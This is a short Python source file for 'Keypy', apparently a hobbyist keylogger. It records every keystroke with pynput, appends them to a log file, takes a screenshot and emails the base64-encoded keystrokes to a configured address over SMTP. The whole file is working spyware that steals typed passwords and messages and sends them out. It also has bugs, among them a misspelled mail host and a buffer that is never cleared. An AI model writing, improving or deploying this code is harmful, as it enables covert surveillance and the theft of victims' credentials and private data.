#!/usr/bin/python3
# -*- coding: utf-8 -*-

""":
    ██╗░░██╗███████╗██╗░░░██╗██████╗░██╗░░░██╗
    ██║░██╔╝██╔════╝╚██╗░██╔╝██╔══██╗╚██╗░██╔╝
    █████═╝░█████╗░░░╚████╔╝░██████╔╝░╚████╔╝░
    ██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔═══╝░░░╚██╔╝░░
    ██║░╚██╗███████╗░░░██║░░░██║░░░░░░░░██║░░░
    ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░ 0.1.0
"""

# Modules

from pynput.keyboard import Key, Listener
from rich.console import Console
import sys
import argparse
import os
import pyautogui
from config import count, email
import smtplib
import base64

# Logic

console = Console()

class Keypy:
    def __init__(self, count, email):
        self.email = email
        self.count = count
        self.t = ""
    def Mail(self):
        data = base64.b64encode(self.t.encode())
        server = smtplib.SMTP('smpt.gmail.com:587')
        server.starttls()
        server.login("email@em.com", "password")
        server.sendmail("email@em.com", self.email, data)
        server.close()
    def write_keyboard(self, key):
        self.t += (
            str(key)
            .replace("'", "")
            .replace("Key.space", "[SPACE]")
            .replace("Key.shift", "[SHIFT]")
            .replace("Key.ctrl", "[CTRL]")
            .replace("Key.enter", "[ENTER]")
            .replace("Key.backspace", "[BACKSPACE]")
        )
        if len(self.t) >= self.count:
            f = open("Logfile.txt", "a")
            f.write(self.t.replace("'", ""))
            f.close()
            t = ""
            pyautogui.screenshot().save('screenshot.png')
            self.Mail()


if __name__ == "__main__":

    keypy = Keypy(count, email)

    try:
        f = open("Logfile.txt", "a")
        f.close()
    except:
        f = open("Logfile.txt", "w")
        f.close()

    with Listener(on_press=keypy.write_keyboard) as listener:
        listener.join()
